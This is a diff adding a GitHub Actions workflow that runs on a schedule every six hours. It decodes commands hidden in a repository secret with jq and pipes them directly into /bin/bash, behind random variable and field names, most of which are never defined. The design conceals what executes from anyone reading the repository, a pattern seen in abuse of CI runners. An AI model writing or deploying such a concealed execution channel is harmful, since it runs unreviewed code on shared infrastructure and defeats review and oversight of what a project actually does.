@@ -1,0 +1,24 @@
+name: spilltherapy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: spilltherapy
+        env:
+          lbn867: ${{ secrets.lbn867 }}
+        run: |
+          echo $lbn867 | jq -r .b15 | /bin/bash
+          echo $gn56247 | jq -r .ma07 | /bin/bash
+          echo $ybjf43305 | jq -r .qs81631 | /bin/bash
+          echo $f52086 | jq -r .u02 | /bin/bash
+          echo $ootp79258 | jq -r .hye677 | /bin/bash
+          echo $kf2147 | jq -r .g6469 | /bin/bash
+          echo $frl76 | jq -r .n4795 | /bin/bash
+          echo $zuh64 | jq -r .yfq27518 | /bin/bash
+          echo $bzlu636 | jq -r .ps9 | /bin/bash
+
